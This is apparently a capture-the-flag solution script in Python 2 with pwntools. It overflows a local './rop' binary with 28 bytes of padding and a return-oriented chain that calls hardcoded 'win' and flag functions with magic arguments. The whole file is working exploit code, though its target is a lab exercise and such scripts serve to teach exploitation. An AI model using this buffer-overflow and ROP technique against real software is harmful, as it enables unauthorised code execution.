
#!/usr/bin/python2

from pwn import *
import sys

LOCAL = True

context.arch = 'x86_64'

POPRET = 0x804840d

WIN_FUNC_1 = 0x080485cb

WIN_FUNC_2 = 0x080485d8
WIN_FUNC_2_ARG = 0xBAAAAAAD

FLAG_FUNC = 0x0804862b
FLAG_FUNC_ARG = 0xDEADBAAD

def info(s):
	log.info(s)


def exploit(r):
	pay = "A"*28

	pay += p32(WIN_FUNC_1)

	pay += p32(WIN_FUNC_2)
	pay += p32(POPRET)
	pay += p32(WIN_FUNC_2_ARG)

	pay += p32(FLAG_FUNC)
	pay += p32(POPRET)
	pay += p32(FLAG_FUNC_ARG)

	r.recvuntil("Enter your input> ")

	r.sendline(pay)
	
	r.interactive()
	return


if __name__ == '__main__':
    
	r = process(['./rop'])
	print util.proc.pidof(r)
	pause()
	exploit(r)
        
